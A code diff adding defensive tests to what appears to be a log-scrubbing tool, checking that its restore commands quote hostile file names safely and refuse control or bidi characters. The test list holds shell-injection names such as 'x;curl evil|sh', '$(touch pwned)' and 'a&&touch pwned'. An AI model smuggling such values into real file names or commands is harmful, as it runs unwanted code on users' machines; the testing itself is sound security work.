@@ -18,6 +18,7 @@ import {
   openSync,
   readdirSync,
   readFileSync,
+  renameSync,
   statSync,
   utimesSync,
   writeFileSync,
@@ -29,8 +30,11 @@ import { afterEach, describe, expect, it, vi } from "vitest";
 import { parseScanFlags, runScan, SCAN_USAGE } from "../commands/scan.js";
 import {
   agentProcessCheck,
+  backupFileName,
   backupFolderName,
+  displayPath,
   isRecentlyModified,
+  isSafePath,
   PROCESS_NAME_GAP,
   RECENT_WRITE_WINDOW_MS,
   restoreCommand,
@@ -1013,6 +1017,119 @@ describe("paths and commands", () => {
     expect(restoreCommand("win32", "C:\\b\\it's.jsonl", "C:\\t\\a.jsonl")).toBe(
       "Copy-Item -LiteralPath 'C:\\b\\it''s.jsonl' -Destination 'C:\\t\\a.jsonl' -Force",
     );
+  });
+});
+
+// ── Restore commands with hostile and unsafe paths ──────────────────────────────
+
+/** Names a file could have that a shell would read as code if quoted badly. Built here only. */
+const HOSTILE_NAMES = [
+  "x;curl evil|sh",
+  "$(touch pwned)",
+  "`touch pwned`",
+  "it's",
+  "a b",
+  'a"b',
+  "a\\b",
+  "*?[x]",
+  "-rf",
+  "~root",
+  "a&&touch pwned",
+  "a\u2019b",
+];
+
+/** Characters no command or terminal line may carry: control, separator and reordering marks. */
+const UNSAFE_CHARS = [
+  String.fromCharCode(0x1b),
+  "\n",
+  "\r",
+  String.fromCharCode(0x07),
+  String.fromCharCode(0x7f),
+  String.fromCharCode(0x9b),
+  "\u2028",
+  "\u202e",
+  "\u2066",
+  "\u200f",
+];
+
+describe("restore commands with hostile names", () => {
+  it.each(HOSTILE_NAMES)("%s: the POSIX command copies the file and runs nothing else", (name) => {
+    if (process.platform === "win32") return;
+    const dir = mkdtempSync(join(tmpdir(), "agenttrail-restore-"));
+    const work = mkdtempSync(join(tmpdir(), "agenttrail-restore-work-"));
+    const original = join(dir, `${name}.jsonl`);
+    const backup = join(dir, backupFileName(1, 1, original));
+    writeFileSync(original, "scrubbed\n");
+    writeFileSync(backup, "original\n");
+    const command = restoreCommand("linux", backup, original);
+    expect(command).toBeDefined();
+    execFileSync("/bin/sh", ["-c", command as string], { cwd: work });
+    expect(readFileSync(original, "utf8")).toBe("original\n");
+    expect(readdirSync(work)).toEqual([]);
+    expect(readdirSync(dir).sort()).toEqual(
+      [backupFileName(1, 1, original), `${name}.jsonl`].sort(),
+    );
+  });
+
+  it("PowerShell: every character it reads as a single quote is doubled", () => {
+    const original = "C:\\t\\a\u2018b\u2019c\u201ad\u201be'f.jsonl";
+    expect(restoreCommand("win32", "C:\\b\\1-x.jsonl", original)).toBe(
+      "Copy-Item -LiteralPath 'C:\\b\\1-x.jsonl' -Destination " +
+        "'C:\\t\\a\u2018\u2018b\u2019\u2019c\u201a\u201ad\u201b\u201be''f.jsonl' -Force",
+    );
+  });
+
+  it.each(
+    UNSAFE_CHARS.map((ch) => [ch.charCodeAt(0).toString(16), ch] as const),
+  )("U+%s: no command is made, and the path is shown with ? in its place", (_code, ch) => {
+    const original = `/t/a${ch}b.jsonl`;
+    expect(isSafePath(original)).toBe(false);
+    expect(restoreCommand("linux", "/b/1-a_b.jsonl", original)).toBeUndefined();
+    expect(restoreCommand("win32", "/b/1-a_b.jsonl", original)).toBeUndefined();
+    expect(restoreCommand("linux", `/b${ch}/1-a.jsonl`, "/t/a.jsonl")).toBeUndefined();
+    expect(displayPath(original)).toBe("/t/a?b.jsonl");
+  });
+
+  it("a backup file's name keeps only safe characters, a number and at most 100 more", () => {
+    expect(backupFileName(1, 1, `/t/${HOSTILE_NAMES[0]} $(id) it's.jsonl`)).toBe(
+      "1-x_curl_evil_sh___id__it_s.jsonl",
+    );
+    expect(backupFileName(3, 12, "/t/a.jsonl")).toBe("03-a.jsonl");
+    expect(backupFileName(1, 1, "C:\\t\\win.jsonl")).toBe("1-win.jsonl");
+    expect(backupFileName(1, 1, "/t/")).toBe("1-file");
+    expect(backupFileName(1, 1, `/t/${"a".repeat(300)}.jsonl`)).toHaveLength(102);
+  });
+
+  it("end to end: a hostile name is restored by restore.txt, an unsafe one gets a note", async () => {
+    if (process.platform === "win32") return;
+    const s = await setup("claude");
+    const [first, second] = s.files as [string, string];
+    const hostile = join(dirname(first), `${HOSTILE_NAMES[0]} $(touch pwned) it's.jsonl`);
+    const unsafe = join(dirname(second), `esc${String.fromCharCode(0x1b)}[31m-red.jsonl`);
+    renameSync(first, hostile);
+    renameSync(second, unsafe);
+    const originals = new Map([hostile, unsafe].map((f) => [f, readFileSync(f)]));
+
+    const run = await scan(s, "claude", ["--scrub", "--apply"]);
+    expect(run.code).toBe(0);
+    expect(isSafePath(run.stdout.replaceAll("\n", ""))).toBe(true);
+    expect(run.stdout).toContain("esc?[31m-red.jsonl");
+    expect(run.stdout).toContain("# could not make a safe restore command for ");
+
+    const dir = backupFolders(s.home)[0] as string;
+    const names = readdirSync(dir).filter((n) => n.endsWith(".jsonl"));
+    expect(names).toHaveLength(2);
+    for (const name of names) expect(name).toMatch(/^[0-9]+-[A-Za-z0-9._-]+$/);
+    const restore = readFileSync(join(dir, "restore.txt"), "utf8");
+    expect(isSafePath(restore.replaceAll("\n", ""))).toBe(true);
+    expect(restore.split("\n").filter((l) => l.startsWith("cp -p "))).toHaveLength(1);
+
+    const work = mkdtempSync(join(tmpdir(), "agenttrail-restore-work-"));
+    execFileSync("/bin/sh", [join(dir, "restore.txt")], { cwd: work });
+    expect(readFileSync(hostile).equals(originals.get(hostile) as Buffer)).toBe(true);
+    expect(readFileSync(unsafe).equals(originals.get(unsafe) as Buffer)).toBe(false);
+    expect(readdirSync(work)).toEqual([]);
+    expect(readdirSync(dirname(first)).filter((n) => n === "pwned")).toEqual([]);
   });
 });
 
